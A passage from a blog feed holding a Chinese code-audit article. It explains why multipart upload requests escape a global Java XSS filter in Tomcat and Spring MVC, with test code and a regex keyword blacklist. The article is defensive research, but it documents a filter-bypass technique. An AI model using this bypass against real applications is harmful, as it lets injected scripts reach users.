      <category term="代码审计" scheme="http://gv7.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>上传包可“绕过”Java过滤器的检查？</title>
    <link href="http://gv7.me/articles/2019/why-can-multipart-post-bypass-java-filter/"/>
    <id>http://gv7.me/articles/2019/why-can-multipart-post-bypass-java-filter/</id>
    <published>2019-03-26T19:49:45.000Z</published>
    <updated>2019-03-28T14:26:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景说明"><a href="#0x01-背景说明" class="headerlink" title="0x01 背景说明"></a>0x01 背景说明</h2><p>月初和southwind0师傅做代码审计时，发现了一个比较奇葩的问题。系统设置了全局的XSS过滤器，在其他功能点上生效了，但在一个公告发布功能没有被过滤。southwind0师傅通过对比数据包发现公告发布数据包是上传包（也就是我们常见的上传POST请求）。后来我经过编写测试代码，发现过滤器确实无法过滤上传数据包的参数值。</p><p>这让我不禁思考 *”上传包可绕过Java过滤器?”*，如果是真的，那么问题很严重呀，以后过滤器岂不是都可以这样绕过，那这样全局XSS，SQL注入防御过滤器岂不是形同虚设？查了下网上大多数提供XSS过滤器代码基本都存在这个问题，我意识到问题的严重性，打算深入Tomcat和Spring MVC的底层代码一探究竟。</p><h2 id="0x02-测试代码"><a href="#0x02-测试代码" class="headerlink" title="0x02 测试代码"></a>0x02 测试代码</h2><p>由于审计的代码属于敏感信息，我编写了一个和审计场景几乎一样的测试Demo用于本文的研究。测试Demo有get，post和upload页面用于测试Java过滤器对三种类型请求数据包的过滤情况。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/testdemo.png" alt="测试Demo"></p><h4 id="2-1-后端处理代码"><a href="#2-1-后端处理代码" class="headerlink" title="2.1 后端处理代码"></a>2.1 后端处理代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"get"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doGet</span><span class="params">(Model model, String str,String bbb)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"get"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"post"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">post</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"post"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"post"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doPost</span><span class="params">(Model model,String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"post"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"upload"</span>,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">upload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"upload"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"upload"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doUpload</span><span class="params">(Model model,String str)</span> </span>&#123;<span class="comment">/*@RequestParam("str") */</span></span><br><span class="line">        System.out.println(<span class="string">"[+] "</span> + str);</span><br><span class="line">        model.addAttribute(<span class="string">"res"</span>,str);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"upload"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-过滤wrapper代码"><a href="#2-2-过滤wrapper代码" class="headerlink" title="2.2 过滤wrapper代码"></a>2.2 过滤wrapper代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XssHttpServletRequestWrapper</span> <span class="keyword">extends</span> <span class="title">HttpServletRequestWrapper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XssHttpServletRequestWrapper</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getParameterValues(String parameter) &#123;</span><br><span class="line">        String[] values = <span class="keyword">super</span>.getParameterValues(parameter);</span><br><span class="line">        <span class="keyword">if</span> (values==<span class="keyword">null</span>)  &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> count = values.length;</span><br><span class="line">        String[] encodedValues = <span class="keyword">new</span> String[count];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            encodedValues[i] = cleanXSS(values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encodedValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getParameter</span><span class="params">(String parameter)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String value = <span class="keyword">super</span>.getParameter(parameter);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHeader</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        String value = <span class="keyword">super</span>.getHeader(name);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">cleanXSS</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">        value = value.replaceAll(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>).replaceAll(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>);</span><br><span class="line"><span class="comment">//        value = value.replaceAll("\\(", "&amp;#40;").replaceAll("\\)", "&amp;#41;");</span></span><br><span class="line">        value = value.replaceAll(<span class="string">"eval\\((.*)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"alert\\((.*?)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"confirm\\((.*?)\\)"</span>, <span class="string">""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']"</span>, <span class="string">"\"\""</span>);</span><br><span class="line">        value = value.replaceAll(<span class="string">"(?i)script"</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-全局过滤器设置"><a href="#2-3-全局过滤器设置" class="headerlink" title="2.3 全局过滤器设置"></a>2.3 全局过滤器设置</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>me.gv7.filter.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>XssFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>想获取完整代码，请到公众号后台回复”上传包绕Java过滤器测试代码”</p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><p>为了方便描述，我这里将请求分文三种，GET型请求，普通POST型请求和上传POST型请求。本文的普通型POST请求指的是除上传POST型请求之外的POST请求，而上传POST型请求就是我们上传包对应的请求。</p><h4 id="3-1-Spring-MVC如何获取到HTTP请求参数值？"><a href="#3-1-Spring-MVC如何获取到HTTP请求参数值？" class="headerlink" title="3.1 Spring MVC如何获取到HTTP请求参数值？"></a>3.1 Spring MVC如何获取到HTTP请求参数值？</h4><p>为了更透彻的理解出现该问题的原因，我们需要搞清楚Spring MVC框架是如何获取到前端传来的HTTP请求的参数值。</p><p>前端提交的请求会先到达Tomcat服务器，其解析请求参数主要在<code>Request.parseParameters()</code>中进行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.connector.Request</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">parseParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.parametersParsed = <span class="keyword">true</span>;</span><br><span class="line">Parameters parameters = <span class="keyword">this</span>.coyoteRequest.getParameters();</span><br><span class="line"><span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">parameters.setLimit(<span class="keyword">this</span>.getConnector().getMaxParameterCount());</span><br><span class="line">...</span><br><span class="line">parameters.handleQueryParameters();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.usingInputStream || <span class="keyword">this</span>.usingReader) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.getConnector().isParseBodyMethod(<span class="keyword">this</span>.getMethod())) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 获取请求包ContentType头</span></span><br><span class="line">String contentType = <span class="keyword">this</span>.getContentType();</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 如果请求ContentType为multipart/form-data，也就是上传POST</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"multipart/form-data"</span>.equals(contentType)) &#123;</span><br><span class="line"><span class="comment">//对上传包进行解析</span></span><br><span class="line"><span class="keyword">this</span>.parseParts();</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">"application/x-www-form-urlencoded"</span>.equals(contentType)) &#123;</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="keyword">this</span>.getContentLength();</span><br><span class="line">...</span><br><span class="line">parameters.processParameters(formData, <span class="number">0</span>, len);</span><br><span class="line">...</span><br><span class="line">success = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tomcat会根据<code>ContentType</code>是否为<code>multipart/form-data</code>判断是否问上传POST型请求，若是则会调用<br><code>parseParts()</code>来解析，我们继续跟进。由于<code>allowCasualMultipartParsing</code>配置项默认为<code>false</code>,<code>parseParts()</code>直接就返回了,也就是说Tomcat默认不会解析上传POST请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseParts</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.parts == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.partsParseException == <span class="keyword">null</span>) &#123;</span><br><span class="line">            MultipartConfigElement mce = <span class="keyword">this</span>.getWrapper().getMultipartConfigElement();</span><br><span class="line">            <span class="keyword">if</span> (mce == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Tomcat7.0+ 已经内置了multipart支持，但是必须显示激活,默认关闭。在全局tomcat配置文件context.xml,或者为war的本地context.xml添加&lt;Context allowCasualMultipartParsing="true"&gt;开启。</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.getContext().getAllowCasualMultipartParsing()) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.parts = Collections.emptyList();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对针对GET行请求和普通POST，Tomcat会调用<code>parameters.processParameters()</code>方法来解析。我们简单看下它的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processParameters</span><span class="params">(<span class="keyword">byte</span>[] bytes, <span class="keyword">int</span> start, <span class="keyword">int</span> len, Charset charset)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">      <span class="keyword">int</span> decodeFailCount = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> pos = start;</span><br><span class="line">      <span class="keyword">int</span> end = start + len;</span><br><span class="line"></span><br><span class="line">      label172:</span><br><span class="line">      <span class="keyword">while</span>(pos &lt; end) &#123;</span><br><span class="line">          <span class="keyword">int</span> nameStart = pos;</span><br><span class="line">          <span class="keyword">int</span> nameEnd = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">int</span> valueStart = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">int</span> valueEnd = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">boolean</span> parsingName = <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">boolean</span> decodeName = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">boolean</span> decodeValue = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">boolean</span> parameterComplete = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="keyword">switch</span>(bytes[pos]) &#123;</span><br><span class="line">              <span class="comment">/*如果遇到%(37)和+(43),会对值进行进行URL解码*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">37</span>:</span><br><span class="line">              <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      decodeName = <span class="keyword">true</span>;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      decodeValue = <span class="keyword">true</span>;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  ++pos;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="comment">/*如果遇到的&amp;(38)，标记该处为参数名和参数值结尾*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">38</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      nameEnd = pos;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      valueEnd = pos;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  parameterComplete = <span class="keyword">true</span>;</span><br><span class="line">                  ++pos;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="comment">/*如果遇到=(61)，标记该处为参数名的结尾，参数值的开始处*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">61</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      nameEnd = pos;</span><br><span class="line">                      parsingName = <span class="keyword">false</span>;</span><br><span class="line">                      ++pos;</span><br><span class="line">                      valueStart = pos;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      ++pos;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">default</span>:</span><br><span class="line">                  ++pos;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="keyword">while</span>(!parameterComplete &amp;&amp; pos &lt; end);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (pos == end) &#123;</span><br><span class="line">              <span class="keyword">if</span> (nameEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">                  nameEnd = pos;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valueStart &gt; -<span class="number">1</span> &amp;&amp; valueEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">                  valueEnd = pos;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>至此，Tomcat层面对前端请求解析工作结束。接下来Spring MVC会收到Tomcat传来的<code>HttpServletRequest</code>，此时若请求为上传POST型，Spring MVC会继续调用<code>commons-fileuplad.jar</code>对Tomcat传来的原生Servlet请求类<code>HttpServletRequest</code>的实例进行解析处理。</p><p>Spring MVC将原生的<code>HttpServletRequest</code>对象传入<code>CommonsMultipartResolver</code>类的<code>parseRequest()</code>方法进行解析处理。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/CommonsMultipartResolver.parseRequest.png" alt="CommonsMultipartResolver类parseRequest()方法"></p><p><code>CommonsMultipartResolver.parseRequest()</code>方法主要分两步对上传请求进行解析。</p><ul><li>第一步，调用<code>commons-fileupload.jar</code>中的<code>ServletFileUpload</code>类的<code>parseRequest()</code>方法来解析出保存有上传表单各个元素的<code>FileItem</code>列表。</li><li>第二步，调用<code>CommonsFileUploadSupport.parseFileItem()</code>方法解析<code>FileItem</code>列表为保存有表单字段名，字段值等信息<code>MultipartParsingResult</code>类型的<code>Map</code>。</li></ul><p>下面我们来看下这两步的执行细节。首先第一步最终的处理方法为<code>FileUploadBase.parseRequest()</code></p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/FileUploadBase.parseRequest.png" alt="FileUploadBase类parseRequest()方法"></p><p><code>FileUploadBase.parseRequest()</code>解析完会返回一个<code>FileItem</code>实例列表。<code>FileItem</code>就是存储着上传表单的各种元素（字段名，ContentType，是否是简单表单字段，文件名。）本例中我们提交的上传表单的<code>FileItem</code>内容如下：</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/FileItem.png" alt="FileItem实例对象"></p><p>接着来到第二步，调用<code>CommonsFileUploadSupport.parseFileItem()</code>对<code>commons-fileupload.jar</code>处理的结果—FileItem列表，进行处理。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/CommonsFileUploadSupport.parseFileItems.png" alt="CommonsFileUploadSupport类parseFileItems()方法"></p><p>最后将上传表单解析的所有元素（multipartFiles，multipartParameters，multipartParameterContentTypes）封装为一个<code>MultipartParsingResult</code>并返回。至此上传POST型请求的解析工作完成。</p><p>最后Spring MVC，会使用<code>HandlerMethodInvoker.resolveRequestParam()</code>方法，将解析好的请求参数的值，绑定到不同的对象上，方便Controller层获取。具体我们在下面说。</p><h4 id="3-2-上传包无法被过滤的原理"><a href="#3-2-上传包无法被过滤的原理" class="headerlink" title="3.2 上传包无法被过滤的原理"></a>3.2 上传包无法被过滤的原理</h4><p>上面我们用较大边幅说明了Spring MVC是如何获取到前端发来的请求的参数值。下面我们就很好理解，问题的所在了。</p><p>经过跟踪发现，Spring MVC对各类型请求参数的解析并实现自动绑定，主要在<code>HandlerMethodInvoker.resolveRequestParam()</code>方法。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/HandlerMethodInvoker.resolveRequestParam.png" alt="HandlerMethodInvoker类resolveRequestParam()方法"></p><p>继续跟进到获取参数值的那一步。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/ServletWebRequest.getParameterValues.png" alt="ServletWebRequest类getParameterValues()方法"></p><p>通过调式发现，这里如果是GET型和普通POST型请求的话，<code>getRequest()</code>获取到的对象是我们编写的过滤类<code>XssHttpServletRequestWrapper</code>的实例，故调用该对象<code>getParameterValues()</code>来获取值，自然是被过滤了！</p><p>若是上传POST行请求的话，<code>getRequest()</code>获取到的是<code>CommonsMultipartResolver</code>类的对象。但实际上调用该对象的<code>getParamterValues()</code>方法，会执行到<code>DefaultMultipartHttpServletRequest</code>类的<code>getParamterValues()</code>类获取值。这是调式发现的，我暂时也没有搞清楚为何，不过不影响我们解决本次研究的问题。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/DefaultMultipartHttpServletRequest.getParameterValues.png" alt="DefaultMultipartHttpServletRequest类的getParameterValues方法"></p><p>到这里我们基本明白了，上传包中的参数值没有被过滤，是因为Spring MVC在解析上传包获取其参数值时，没有使用我们编写的过滤类<code>XssHttpServletRequestWrapper</code>中的<code>getParamterValues()</code>方法，而是使用了<code>DefaultMultipartHttpServletRequest</code>类<code>getParamterValuses()</code>。</p><p><strong>你可能有疑问，为何SpringMVC获取上传POST请求的参数值时，为啥不调用XssHttpServletRequestWrapper.getParamterValues()来获取呢？</strong></p><p><strong>答：因为这样获取不到。</strong></p><p>借助以下相关类和接口的继承实现关系图，我们继续看看为何获取不到。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/DefaultMultipartHttpServletRequest.png" alt="相关类和接口的继承实现关系"></p><p>结合我们上面对Spring MVC和Tomcat如何解析到请求包的参数值的过程，知道GET型和普通POST型请求包是可以通过<code>HttpServletRequest.getParameterValues()</code>直接获取到对应参数的值，而通过图中可知<code>XssHttpServletRequestWrapper</code>实现了<code>HttpServletRequest</code>，自然也是可以通过<code>XssHttpServletRequestWrapper.getParameterValues()</code>获取到的。</p><p>但上传包Tomcat默认没有解析，根据继承关系<code>XssHttpServletRequestWrapper</code>对象中保存的解析结果为Tomcat解析请求的结果，故通过该对象的<code>getParameterValues()</code>方法获取到的参数值为<code>null</code>。也是因此Spring 